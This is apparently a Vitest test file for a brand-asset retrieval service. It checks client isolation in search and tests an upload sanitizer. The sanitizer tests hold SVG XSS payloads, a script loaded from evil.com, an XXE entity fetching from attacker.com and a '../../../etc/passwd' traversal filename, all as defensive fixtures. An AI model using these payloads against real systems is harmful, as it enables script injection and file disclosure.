import { describe, it, expect } from 'vitest';
import { DoclingParser } from '../src/docling-parser.js';
import { RetrievalService } from '../src/retrieval-service.js';
import { sanitizeUntrustedUpload } from '../src/upload-sanitizer.js';
import type { RequestContext } from '@hawa/contracts';

describe('Retrieval: Ingestion & Client-Locked Search', () => {
  const ctx: RequestContext & { clientId: string } = {
    tenantId: 'tenant-1',
    clientId: 'client-aster',
    actor: { type: 'workflow', id: 'retrieval-wf' },
    correlationId: 'corr-1',
    deadline: new Date(Date.now() + 60000).toISOString(),
    idempotencyKey: 'retrieval-key-1',
  };

  it('DoclingParser: extracts paragraph chunks with coordinates and content hashes', async () => {
    const parser = new DoclingParser();
    const parsed = await parser.parse(
      'doc-1',
      'First paragraph of brand guide.\n\nSecond paragraph detailing logo clear space rules.',
      'text/plain',
      'brand_guide_v1.pdf'
    );

    expect(parsed.documentId).toBe('doc-1');
    expect(parsed.chunks.length).toBe(2);
    expect(parsed.chunks[0].sha256).toBeDefined();
    expect(parsed.chunks[0].metadata.coordinates).toBeDefined();
  });

  it('RetrievalService: strictly enforces client isolation and zero cross-client leakage', async () => {
    const service = new RetrievalService();

    // Ingest data for client Aster
    service.addKnowledgeItem({
      id: 'k-1',
      clientId: 'client-aster',
      kind: 'rule',
      sourceId: 'rule-aster-1',
      title: 'Aster Color Rule',
      text: 'Aster primary brand color is forest green #164a3a.',
      polarity: 'positive',
      approved: true,
      active: true,
      metadata: {},
    });

    // Ingest data for client Nova
    service.addKnowledgeItem({
      id: 'k-2',
      clientId: 'client-nova',
      kind: 'rule',
      sourceId: 'rule-nova-1',
      title: 'Nova Secret Brand Strategy',
      text: 'Nova confidential pricing strategy.',
      polarity: 'positive',
      approved: true,
      active: true,
      metadata: {},
    });

    // Query under client Aster
    const res = await service.retrieve(ctx, [
      { query: 'brand strategy color', kinds: ['rule'], topK: 10 },
    ]);

    expect(res.ok).toBe(true);
    if (res.ok) {
      const returnedIds = res.value.authoritative.rules.map((r) => r.id);
      expect(returnedIds).toContain('k-1');
      // Invariant 6: Zero cross-client leakage
      expect(returnedIds).not.toContain('k-2');
    }
  });

  it('RetrievalService: partitions positive references and negative constraints', async () => {
    const service = new RetrievalService();

    service.addKnowledgeItem({
      id: 'ex-pos',
      clientId: 'client-aster',
      kind: 'approved_example',
      sourceId: 'ex-1',
      title: 'Summer Poster 2025',
      text: 'High performing retail poster with warm gold accent.',
      polarity: 'positive',
      approved: true,
      active: true,
      metadata: {},
    });

    service.addKnowledgeItem({
      id: 'ex-neg',
      clientId: 'client-aster',
      kind: 'negative_example',
      sourceId: 'ex-neg-1',
      title: 'Rejected Draft 2025',
      text: 'Too busy typography and overlapping logo margin.',
      polarity: 'negative',
      approved: false,
      active: true,
      metadata: {},
    });

    const res = await service.retrieve(ctx, [
      { query: 'poster typography logo', kinds: ['approved_example', 'negative_example'], topK: 5 },
    ]);

    expect(res.ok).toBe(true);
    if (res.ok) {
      expect(res.value.evidence.some((c) => c.id === 'ex-pos')).toBe(true);
      expect(res.value.negativeEvidence.some((c) => c.id === 'ex-neg')).toBe(true);
    }
  });

  it('sanitizeUntrustedUpload: strips dangerous tags, handlers, unquoted schemes, and inline style XSS', () => {
    const maliciousSvg = '<svg/onload=alert(1)><foreignObject><iframe src="http://evil.com"></iframe></foreignObject><a href=javascript:alert(2)><text>click</text></a><circle style="background:url(javascript:alert(3))" /></svg>';

    const res = sanitizeUntrustedUpload({
      filename: 'asset.svg',
      mimeType: 'image/svg+xml',
      content: maliciousSvg,
    });

    expect(res.ok).toBe(true);
    if (res.ok) {
      const sanitized = res.value.sanitizedContent.toString('utf8');
      expect(sanitized).not.toContain('onload');
      expect(sanitized).not.toContain('foreignObject');
      expect(sanitized).not.toContain('iframe');
      expect(sanitized).not.toContain('javascript:alert');
      expect(sanitized).not.toContain('background:url');
      expect(res.value.warnings.length).toBeGreaterThan(0);
    }
  });

  it('sanitizeUntrustedUpload: neutralizes slash-delimited script tags and multiline DOCTYPE DTD expansions', () => {
    const maliciousSvg = '<svg><script/src="http://evil.com/xss.js"></script><text>logo</text></svg>';
    const res = sanitizeUntrustedUpload({
      filename: 'exploit.svg',
      mimeType: 'image/svg+xml',
      content: maliciousSvg,
    });

    expect(res.ok).toBe(true);
    if (res.ok) {
      const sanitized = res.value.sanitizedContent.toString('utf8');
      expect(sanitized).not.toContain('script');
      expect(sanitized).not.toContain('evil.com');
      expect(res.value.warnings.length).toBeGreaterThan(0);
    }

    const xxeSvg = '<!DOCTYPE svg [\n  <!ENTITY % remote SYSTEM "http://attacker.com/xxe.dtd">\n  %remote;\n]>\n<svg><text>hello</text></svg>';
    const xxeRes = sanitizeUntrustedUpload({
      filename: '../../../etc/passwd',
      mimeType: 'image/svg+xml',
      content: xxeSvg,
    });

    expect(xxeRes.ok).toBe(true);
    if (xxeRes.ok) {
      const sanitized = xxeRes.value.sanitizedContent.toString('utf8');
      expect(sanitized).not.toContain('<!DOCTYPE');
      expect(sanitized).not.toContain('%remote;');
      expect(sanitized).not.toContain(']>');
      // Filename path traversal stripped
      expect(xxeRes.value.filename).toBe('passwd');
    }
  });
});
